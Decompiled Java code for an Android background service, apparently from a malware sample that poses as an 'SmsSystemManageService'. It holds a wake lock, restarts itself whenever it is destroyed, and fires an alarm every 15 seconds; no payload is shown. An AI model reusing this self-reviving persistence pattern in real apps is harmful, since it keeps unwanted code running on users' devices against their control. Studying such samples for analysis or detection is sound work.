// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.tnt2;

import android.app.*;
import android.content.Intent;
import android.os.*;
import android.telephony.TelephonyManager;
import com.example.utils.AlarmReceiver;
import java.util.Timer;
import java.util.TimerTask;

public final class neio32 extends Service
{

    public neio32()
    {
        telManager = null;
        timer = null;
        ttTask = null;
    }

    public IBinder onBind(Intent intent)
    {
        return null;
    }

    public void onCreate()
    {
        wakeLock = ((PowerManager)getSystemService("power")).newWakeLock(1, com/example/tnt2/neio32.getName());
        wakeLock.acquire();
        isDoing = false;
    }

    public void onDestroy()
    {
        super.onDestroy();
        if(wakeLock != null)
        {
            wakeLock.release();
            wakeLock = null;
        }
        Intent intent = new Intent();
        intent.setClass(this, com/example/tnt2/neio32);
        startService(intent);
    }

    public void onStart(Intent intent, int i)
    {
        super.onStart(intent, i);
        Intent intent1 = new Intent(getApplicationContext(), com/example/utils/AlarmReceiver);
        intent1.setAction("repeating");
        PendingIntent pendingintent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent1, 0);
        long l = SystemClock.elapsedRealtime();
        ((AlarmManager)getSystemService("alarm")).setRepeating(2, l, 15000L, pendingintent);
    }

    public int onStartCommand(Intent intent, int i, int j)
    {
        return super.onStartCommand(intent, i, j);
    }

    private static final String TAG = "SmsSystemManageService";
    static String s1 = "111111";
    static String s2 = "22222";
    private boolean isDoing;
    TelephonyManager telManager;
    private Thread thread;
    Timer timer;
    TimerTask ttTask;
    android.os.PowerManager.WakeLock wakeLock;

}
